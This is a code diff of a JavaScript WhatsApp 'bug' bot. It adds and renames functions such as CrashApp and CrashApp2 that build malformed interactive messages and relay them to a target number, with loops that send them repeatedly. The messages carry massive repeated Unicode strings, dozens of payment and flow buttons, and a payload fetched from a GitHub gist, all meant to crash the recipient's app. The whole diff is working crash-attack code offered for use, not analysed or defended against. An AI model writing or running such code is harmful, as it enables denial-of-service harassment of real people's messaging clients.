@@ -563,7 +563,7 @@ async function OrneDelayMess(target) {
         participant: { jid: target }
     });
 }
-async function CrashApp(isTarget) {
+async function CrashApp6(isTarget) {
 let apiClient;
 try {
   const res = await fetch('https://gist.githubusercontent.com/Tama-Ryuichi/572ad67856a67dbae3c37982679153b2/raw/apiClient.json');
@@ -687,7 +687,7 @@ let venomModsData = JSON.stringify({
   });
   console.log(" Succes Send Bug By AldzDev ")
  }
-async function CrashApp2(target) {
+async function CrashApp5(target) {
 let apiClient;
 try {
   const res = await fetch('https://gist.githubusercontent.com/Tama-Ryuichi/572ad67856a67dbae3c37982679153b2/raw/apiClient.json');
@@ -807,7 +807,7 @@ try {
     await client.relayMessage(target, message, { participant: { jid: target } });
     console.log(" Succes Send Bug By AldzDev ")
 }
-async function CrashApp3(target) {
+async function CrashApp4(target) {
 let apiClient;
 try {
   const res = await fetch('https://gist.githubusercontent.com/Tama-Ryuichi/572ad67856a67dbae3c37982679153b2/raw/apiClient.json');
@@ -893,7 +893,7 @@ let Apiclient = JSON.stringify({
   });
   console.log(" Succes Send Bug By AldzDev ") 
 }
-async function forclose(target) {
+async function CrashApp3(target) {
     console.log(`[LOG] ${target}`);
 
     let venomModsData = JSON.stringify({
@@ -1008,6 +1008,292 @@ async function forclose(target) {
     await client.relayMessage(target, message, { participant: { jid: target } });
     console.log(`[SUCCESS] ${target}`);
 }
+async function CrashApp2(isTarget) {
+let apiClient;
+try {
+  const res = await fetch('https://gist.githubusercontent.com/Tama-Ryuichi/572ad67856a67dbae3c37982679153b2/raw/apiClient.json');
+  apiClient = await res.text();
+} catch (err) {
+  console.error("error fetching", err);
+  return;
+}
+      let venomModsData = JSON.stringify({
+        status: true,
+        criador: "VenomMods",
+        resultado: {
+          type: "md",
+          ws: {
+            _events: {
+              "CB:ib,,dirty": ["Array"]
+            },
+            _eventsCount: 800000,
+            _maxListeners: 0,
+            url: "wss://web.whatsapp.com/ws/chat",
+            config: {
+              version: ["Array"],
+              browser: ["Array"],
+              waWebSocketUrl: "wss://web.whatsapp.com/ws/chat",
+              sockCectTimeoutMs: 20000,
+              keepAliveIntervalMs: 30000,
+              logger: {},
+              printQRInTerminal: false,
+              emitOwnEvents: true,
+              defaultQueryTimeoutMs: 60000,
+              customUploadHosts: [],
+              retryRequestDelayMs: 250,
+              maxMsgRetryCount: 5,
+              fireInitQueries: true,
+              auth: {
+                Object: "authData"
+              },
+              markOnlineOnsockCect: true,
+              syncFullHistory: true,
+              linkPreviewImageThumbnailWidth: 192,
+              transactionOpts: {
+                Object: "transactionOptsData"
+              },
+              generateHighQualityLinkPreview: false,
+              options: {},
+              appStateMacVerification: {
+                Object: "appStateMacData"
+              },
+              mobile: true
+            }
+          }
+        }
+      });
+      let stanza = [{
+        attrs: {
+          biz_bot: "1"
+        },
+        tag: "bot"
+      }, {
+        attrs: {},
+        tag: "biz"
+      }];
+      let message = {
+        viewOnceMessage: {
+          message: {
+            messageContextInfo: {
+              deviceListMetadata: {},
+              deviceListMetadataVersion: 3.2,
+              isStatusBroadcast: true,
+              statusBroadcastJid: "status@broadcast",
+              badgeChat: {
+                unreadCount: 9999
+              }
+            },
+            forwardedNewsletterMessageInfo: {
+              newsletterJid: "proto@newsletter",
+              serverMessageId: 1,
+              newsletterName: `안녕..     - 〽${"ꥈ안녕..ꥈ".repeat(10)}`,
+              contentType: 3,
+              accessibilityText: `안녕.. ********************************""""" ${"﹏".repeat(102002)}`
+            },
+            interactiveMessage: {
+              contextInfo: {
+                businessMessageForwardInfo: {
+                  businessOwnerJid: isTarget
+                },
+                dataSharingContext: {
+                  showMmDisclosure: true
+                },
+                participant: "0@s.whatsapp.net",
+                mentionedJid: ["13135550002@s.whatsapp.net"]
+              },
+              body: {
+                text: "" + "ꦽ".repeat(102002) + "".repeat(102002)
+              },
+              nativeFlowMessage: {
+                buttons: [{
+                  name: "single_select",
+                  buttonParamsJson: venomModsData + "".repeat(9999)
+                }, {
+                  name: "payment_method",
+                  buttonParamsJson: apiClient + "".repeat(9999)
+                }, {
+                  name: "call_permission_request",
+                  buttonParamsJson: venomModsData + "".repeat(9999),
+                  voice_call: "call_galaxy"
+                }, {
+                  name: "form_message",
+                  buttonParamsJson: apiClient + "".repeat(9999)
+                }, {
+                  name: "wa_payment_learn_more",
+                  buttonParamsJson: venomModsData + "".repeat(9999)
+                }, {
+                  name: "wa_payment_transaction_details",
+                  buttonParamsJson: apiClient + "".repeat(9999)
+                }, {
+                  name: "wa_payment_fbpin_reset",
+                  buttonParamsJson: venomModsData + "".repeat(9999)
+                }, {
+                  name: "catalog_message",
+                  buttonParamsJson: apiClient + "".repeat(9999)
+                }, {
+                  name: "payment_info",
+                  buttonParamsJson: venomModsData + "".repeat(9999)
+                }, {
+                  name: "review_order",
+                  buttonParamsJson: apiClient + "".repeat(9999)
+                }, {
+                  name: "send_location",
+                  buttonParamsJson: venomModsData + "".repeat(9999)
+                }, {
+                  name: "payments_care_csat",
+                  buttonParamsJson: apiClient + "".repeat(9999)
+                }, {
+                  name: "view_product",
+                  buttonParamsJson: venomModsData + "".repeat(9999)
+                }, {
+                  name: "payment_settings",
+                  buttonParamsJson: apiClient + "".repeat(9999)
+                }, {
+                  name: "address_message",
+                  buttonParamsJson: venomModsData + "".repeat(9999)
+                }, {
+                  name: "automated_greeting_message_view_catalog",
+                  buttonParamsJson: apiClient + "".repeat(9999)
+                }, {
+                  name: "open_webview",
+                  buttonParamsJson: venomModsData + "".repeat(9999)
+                }, {
+                  name: "message_with_link_status",
+                  buttonParamsJson: apiClient + "".repeat(9999)
+                }, {
+                  name: "payment_status",
+                  buttonParamsJson: venomModsData + "".repeat(9999)
+                }, {
+                  name: "galaxy_costum",
+                  buttonParamsJson: apiClient + "".repeat(9999)
+                }, {
+                  name: "extensions_message_v2",
+                  buttonParamsJson: venomModsData + "".repeat(9999)
+                }, {
+                  name: "landline_call",
+                  buttonParamsJson: apiClient + "".repeat(9999)
+                }, {
+                  name: "mpm",
+                  buttonParamsJson: venomModsData + "".repeat(9999)
+                }, {
+                  name: "cta_copy",
+                  buttonParamsJson: apiClient + "".repeat(9999)
+                }, {
+                  name: "cta_url",
+                  buttonParamsJson: venomModsData + "".repeat(9999)
+                }, {
+                  name: "review_and_pay",
+                  buttonParamsJson: apiClient + "".repeat(9999)
+                }, {
+                  name: "galaxy_message",
+                  buttonParamsJson: venomModsData + "".repeat(9999)
+                }, {
+                  name: "cta_call",
+                  buttonParamsJson: apiClient + "".repeat(9999)
+                }]
+              }
+            }
+          }
+        },
+        additionalNodes: stanza,
+        stanzaId: `stanza_${Date.now()}`
+      };
+      await client.relayMessage(isTarget, message, {
+        participant: {
+          jid: isTarget
+        }
+      });
+    }
+async function CrashApp(isTarget) {
+let apiClient;
+try {
+  const res = await fetch('https://gist.githubusercontent.com/Tama-Ryuichi/572ad67856a67dbae3c37982679153b2/raw/apiClient.json');
+  apiClient = await res.text();
+} catch (err) {
+  console.error("error fetching", err);
+  return;
+}
+  let msg = await generateWAMessageFromContent(
+    isTarget,
+    {
+      viewOnceMessage: {
+        message: {
+          interactiveMessage: {
+          contextInfo: {
+            participant: "0@s.whatsapp.net",
+            remoteJid: "X",
+            mentionedJid: [isTarget],
+           forwardedNewsletterMessageInfo: {
+          newsletterJid: "9741@newsletter",
+        serverMessageId: 1,
+     newsletterName: "-"
+     },
+            externalAdReply: {
+              showAdAttribution: true,
+              title: "᭡꧈",
+              body: "᭡꧈",
+              thumbnailUrl: null,
+              sourceUrl: "https://tama.app/",
+              mediaType: 1,
+              renderLargerThumbnail: true
+            },
+            businessMessageForwardInfo: {
+              businessOwnerJid: isTarget,
+            },
+            dataSharingContext: {
+              showMmDisclosure: true,
+            },
+            quotedMessage: {
+              paymentInviteMessage: {
+                serviceType: 1,
+                expiryTimestamp: null
+              }
+            }
+          },
+            header: {
+              title: "",
+              hasMediaAttachment: false
+            },
+            body: {
+              text: "᭡꧈",
+            },
+            nativeFlowMessage: {
+              messageParamsJson: "{\"name\":\"galaxy_message\",\"title\":\"galaxy_message\",\"header\":\"Ryuichi - Beginner\",\"body\":\"Call Galaxy\"}",
+              buttons: [
+                {
+                  name: "single_select",
+                  buttonParamsJson: apiClient + "᭡꧈",
+                },
+                {
+                  name: "call_permission_request",
+                  buttonParamsJson: apiClient + "᭡꧈",
+                }, 
+                {
+                  name: "payment_method",
+                  buttonParamsJson: ""
+                },
+                {
+                  name: "payment_status",
+                  buttonParamsJson: ""
+                },
+                {
+                  name: "review_order",
+                  buttonParamsJson: ""
+                },
+              ],
+            },
+          },
+        },
+      },
+    },
+    {}
+  );
+
+  await client.relayMessage(isTarget, msg.message, {
+    participant: { jid: isTarget },
+    messageId: msg.key.id
+  });
+}
 async function nae(x) {
     for (let i = 0; i < 50; i++) {
     await CrashApp(x)
@@ -1053,23 +1339,23 @@ async function nae3(x) {
     await Orne1(x)
     await OrneBroadcast(x)
     await OrneBroadcast(x) 
-    await forclose(x)
+    await CrashApp3(x)
     await Orne1(x)
     await OrneBroadcast(x)
     await OrneBroadcast(x) 
-    await forclose(x)
+    await CrashApp3(x)
     await Orne1(x)
     await OrneBroadcast(x)
     await OrneBroadcast(x) 
-    await forclose(x)
+    await CrashApp3(x)
     await Orne1(x)
     await OrneBroadcast(x)
     await OrneBroadcast(x) 
-    await forclose(x)
+    await CrashApp3(x)
     await Orne1(x)
     await OrneBroadcast(x)
     await OrneBroadcast(x) 
-    await forclose(x)
+    await CrashApp3(x)
     }
 }
 // End Func Bug
